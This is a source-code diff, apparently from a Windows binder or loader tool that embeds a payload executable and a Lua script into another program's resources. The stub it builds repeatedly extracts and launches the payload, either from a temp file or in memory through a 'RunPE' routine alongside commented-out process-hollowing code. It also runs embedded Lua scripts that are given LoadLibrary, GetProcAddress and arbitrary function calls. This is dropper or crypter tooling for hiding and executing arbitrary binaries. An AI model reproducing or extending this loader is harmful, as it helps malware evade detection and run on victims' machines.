@@ -2,6 +2,7 @@
 #include "resource.h"
 
 #include "MemoryModule.h"
+#include "LuaFunc.h"
 // #include "ProcessHollowing.h"
 
 #include <windows.h>
@@ -29,18 +30,14 @@ BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WOR
 BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
 BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
 bool update_resource(CString str_path, HANDLE hUpdate, int rid);
-BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"");
+bool update_config(int config, HANDLE hUpdate, int rid);
+BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"", int config = 0);
 
 // 枚举资源类型的回调函数
 BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
 BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
 BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
-BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);
-
-// lua 导出函数
-int l_load_library(lua_State* L);
-int l_get_proc_address(lua_State* L);
-int l_call_function(lua_State* L);
+BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"", int config = 0);
 
 
 // 定义一个函数指针类型，与 DLL 中的导出函数签名匹配
@@ -136,33 +133,6 @@ private:
     SharedData* pSharedData;
 };
 
-class LuaRunner
-{
-public:
-    LuaRunner() {
-        lua_ = luaL_newstate();
-        if (lua_) {
-            luaL_openlibs(lua_);
-
-            // 注册 C++ 函数到 Lua
-            lua_register(L, "LoadLibraryA", l_load_library);
-            lua_register(L, "GetProcAddress", l_get_proc_address);
-            lua_register(L, "call_function", l_call_function);
-        }
-    }
-
-    ~LuaRunner() {
-        lua_close(lua_);
-    }
-
-    bool run_lua(const char* lua_data) {
-        luaL_dostring(lua_, lua_data);
-    }
-
-private:
-    lua_State* lua_;
-};
-
 class CPEGenerator
 {
 public:
@@ -197,9 +167,14 @@ public:
 
                 int cnt = 10;
                 int pid = -1;
+                int config = ExtractLuaGetCfg(IDR_CFG);
                 while (cnt-- && pid == -1) {
-                    // pid = pRunPE(IDR_BINARY_FILE);
-                    ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
+                    if (config) {
+                        pid = pRunPE(IDR_BINARY_FILE);
+                    }
+                    else {
+                        ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
+                    }
                     Sleep(1000);
                 }
 
@@ -238,13 +213,17 @@ public:
             LPCWSTR resourceFilePath = argv[1];
             LPCWSTR newExePath = argv[2];
             CString lua_path;
-            if (argc == 4) {
+            int config = 0;
+            if (argc >= 4) {
                 lua_path = argv[3];
             }
+            if (argc >= 5) {
+                config = 1;
+            }
 #ifdef _WIN64
-            AddFileToResource(exePath, resourceFilePath, newExePath, lua_path);
+            AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
 #else
-            AddFileToResource32(exePath, resourceFilePath, newExePath);
+            AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
 #endif
         }
     }   
@@ -493,10 +472,16 @@ public:
         run_vir.Format(L"\"%s\" run", modulePath); // 注意引号包裹路径
         RunGenerator(run_vir);
 
+        OutputDebugString(L"run lua script start !");
+
+        // 先根据需求运行脚本，防止反复运行，如果要循环在脚本里实现就好
+        ExtractLuaAndRun(IDR_LUA);
+
+        OutputDebugString(L"run lua script end !");
+
         while (FileExists(modulePath)) {
 
-            // 设置启动信息和进程信息结构体    
-            ExtractLuaAndRun(IDR_LUA);
+            // 设置启动信息和进程信息结构体
             RunGenerator(commandLine);
             Sleep(10000);
         }
@@ -734,6 +719,47 @@ public:
 
         // std::wcout << L"Program executed successfully.\n";
         return TRUE;
+    }
+
+    // 提取并运行lua脚本
+    int ExtractLuaGetCfg(int resourceId) {
+        // 加载当前模块
+        HMODULE hModule = GetModuleHandle(NULL);
+        if (!hModule) {
+            // L"Failed to load module. code  = " << GetLastError() << "\n";
+            return FALSE;
+        }
+
+        // 查找资源
+        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
+        if (!hResource) {
+            // L"Failed to find resource.\n";
+            return FALSE;
+        }
+
+        // 加载资源
+        HGLOBAL hResData = LoadResource(hModule, hResource);
+        if (!hResData) {
+            // << L"Failed to load resource.\n";
+            return FALSE;
+        }
+
+        // 获取资源大小和数据指针
+        DWORD dataSize = SizeofResource(hModule, hResource);
+        void* pData = LockResource(hResData);
+
+        LuaRunner runner;
+        size_t lua_len = (size_t)dataSize + 1;
+        char* lua_str = new char[lua_len];
+        memset(lua_str, 0, sizeof(char) * (lua_len));
+        memcpy(lua_str, pData, dataSize);
+
+        int cfg = runner.get_lua_cfg(lua_str);
+
+        delete[] lua_str;
+
+        // std::wcout << L"Program executed successfully.\n";
+        return cfg;
     }
 
 private:
